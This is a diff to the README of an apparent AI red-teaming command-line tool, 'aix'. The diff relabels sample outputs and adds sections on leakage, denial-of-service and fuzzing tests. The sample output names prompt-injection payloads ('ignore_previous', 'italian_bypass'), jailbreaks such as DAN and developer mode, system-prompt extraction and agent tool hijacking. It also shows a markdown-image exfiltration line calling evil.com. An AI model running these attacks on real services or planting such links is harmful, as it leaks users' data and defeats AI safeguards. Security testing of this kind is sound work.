@@ -141,10 +141,10 @@ Test for prompt injection vulnerabilities with 30+ built-in payloads.
 $ aix inject https://api.target.com -k sk-xxx
 
 INJECT  api.target.com                 [*] Testing 30 injection payloads...
-INJECT  api.target.com                 [+] ignore_previous (Pwn3d!)
-INJECT  api.target.com                 [+] xml_injection (Pwn3d!)
+INJECT  api.target.com                 [+] ignore_previous (Vulnerable!)
+INJECT  api.target.com                 [+] xml_injection (Vulnerable!)
 INJECT  api.target.com                 [-] base64_bypass (Blocked)
-INJECT  api.target.com                 [+] italian_bypass (Pwn3d!)
+INJECT  api.target.com                 [+] italian_bypass (Vulnerable!)
 INJECT  api.target.com                 [*] 12 successful, 18 blocked
 ```
 
@@ -156,8 +156,8 @@ Test jailbreak techniques including DAN, Evil Confidant, Developer Mode, and mor
 $ aix jailbreak https://chat.target.com --browser
 
 JAILBRK chat.target.com                [*] Testing 15 jailbreak techniques...
-JAILBRK chat.target.com                [+] DAN_v11 (Pwn3d!)
-JAILBRK chat.target.com                [+] developer_mode (Pwn3d!)
+JAILBRK chat.target.com                [+] DAN_v11 (Vulnerable!)
+JAILBRK chat.target.com                [+] developer_mode (Vulnerable!)
 JAILBRK chat.target.com                [-] grandma_exploit (Blocked)
 JAILBRK chat.target.com                [!] AI restrictions bypassed!
 ```
@@ -170,7 +170,7 @@ Extract hidden system prompts and configurations.
 $ aix extract https://api.target.com -k sk-xxx
 
 EXTRACT api.target.com                 [*] Attempting extraction...
-EXTRACT api.target.com                 [+] repeat_technique (Pwn3d!)
+EXTRACT api.target.com                 [+] repeat_technique (Vulnerable!)
 EXTRACT api.target.com                 [*] System prompt captured!
 
 ╔══════════════════════════════════════════════════════════════════╗
@@ -181,6 +181,19 @@ EXTRACT api.target.com                 [*] System prompt captured!
 ╚══════════════════════════════════════════════════════════════════╝
 ```
 
+### `aix leak` - Data Leakage
+
+Detect training data exposure and PII leakage.
+
+```bash
+$ aix leak https://api.target.com -k sk-xxx
+
+LEAK    api.target.com                 [*] Testing PII leakage...
+LEAK    api.target.com                 [+] phone_number_response (Vulnerable!)
+LEAK    api.target.com                 [+] email_pattern_found (Vulnerable!)
+LEAK    api.target.com                 [!] Potential PII exposure detected
+```
+
 ### `aix exfil` - Data Exfiltration
 
 Test data exfiltration channels.
@@ -188,9 +201,9 @@ Test data exfiltration channels.
 ```bash
 $ aix exfil https://api.target.com -k sk-xxx --webhook https://evil.com
 
-EXFIL   api.target.com                 [+] markdown_images (Pwn3d!)
+EXFIL   api.target.com                 [+] markdown_images (Vulnerable!)
         └─→ AI will load: ![](https://evil.com/steal?data=...)
-EXFIL   api.target.com                 [+] link_injection (Pwn3d!)
+EXFIL   api.target.com                 [+] link_injection (Vulnerable!)
 EXFIL   api.target.com                 [!] Data exfiltration POSSIBLE
 ```
 
@@ -202,9 +215,35 @@ Test AI agents for tool abuse and unauthorized actions.
 $ aix agent https://agent.target.com -k sk-xxx
 
 AGENT   agent.target.com               [*] Tools found: web_search, code_exec, email
-AGENT   agent.target.com               [+] code_exec hijack (Pwn3d!)
+AGENT   agent.target.com               [+] code_exec hijack (Vulnerable!)
 AGENT   agent.target.com               [!] CRITICAL: Full agent compromise possible
 ```
+
+### `aix dos` - Denial of Service
+
+Test for resource exhaustion and availability issues.
+
+```bash
+$ aix dos https://api.target.com -k sk-xxx
+
+DOS     api.target.com                 [*] Testing resource limits...
+DOS     api.target.com                 [+] infinite_loop_prompt (Vulnerable!)
+DOS     api.target.com                 [!] Warning: Target latency increased > 5s
+```
+
+### `aix fuzz` - Fuzzing
+
+Fuzz inputs to find edge cases and unhandled errors.
+
+```bash
+$ aix fuzz https://api.target.com -k sk-xxx
+
+FUZZ    api.target.com                 [*] Starting fuzzing session...
+FUZZ    api.target.com                 [+] crash_unicode_overflow (Vulnerable!)
+FUZZ    api.target.com                 [+] json_depth_limit (Vulnerable!)
+```
+
+
 
 ## 🎛️ Options
 
